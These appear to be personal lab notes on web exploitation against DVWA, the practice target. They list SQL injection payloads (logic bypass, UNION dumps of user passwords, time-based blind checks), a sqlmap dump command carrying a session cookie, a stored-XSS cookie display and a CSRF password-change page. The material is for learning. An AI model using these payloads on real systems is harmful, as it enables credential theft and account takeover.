# Web Exploitation
Normally the query is: 

```sql 
SELECT first_name, last_name FROM users WHERE user_id = '$id'
``` 

`$id = ' or 1=1 --`

`' or 1=1 <-- or #>` - logic bypass

## UNION METHOD

`' or 1=0 union select table_name, null from information_schema.tables #` - 1=0 avoid getting everything. As the query returns 2 columns, we need to use null to match with the original query. Exit= name of the tables

`' or 1=0 union select column_name, null from information_schema.columns where table_name='users' #`

`' or 1=0 union select user, password from users # `

`' or 1=0 union select null, concat(user, ':', password) from users #`

## BLIND SQL INJECTION

TIME BASED BLIND SQL INJECTION --> differenciate yes or no by time

`1' and 1=0 and sleep(5) # `

`1' and 1=1 and sleep(5) #`  wait for 5 sec
`1' and substring(system_user(), 1, 1)='a' and sleep(5)` # respuesta inmediata --> substring is false
`1' and substring(system_user(), 1, 1)='r' and sleep(5)` # respuesta no inmediata --> substring is true

## SQLMAP

`sqlmap -u URL -cookie="xx" --technique=T -D dvwa -T users -columns --dump` --> if dont specify columns or table it dumps everything

URL 
cookie en inspect
`sqlmap -u "http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -cookie="security=low;PHPSESSID=7d3a52789a7d415e457325f3510bb749" --technique=T -D dvwa -T users -columns --dump`

---

STORED XSS

In message box:

```html  
<script>
alert("This is a message from a Hacker. Your coockie is: " + document.cookie)
</script>
``` 


CSRF
change password to a user:

The URL is now: 

http://192.168.0.101/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change#


In the consolote:

`nano csrf.html` Create a simple webpage with an image that visits the url.

```html
<html>
<body>

<h1> This is a test! </h1>

<img source="http://192.168.0.101/dvwa/vulnerabilities/csrf/?password_new=test2&password_conf=test2&Change=Change#">

</body>
</html>
```

now mount the hacker webserver

python -m http.server


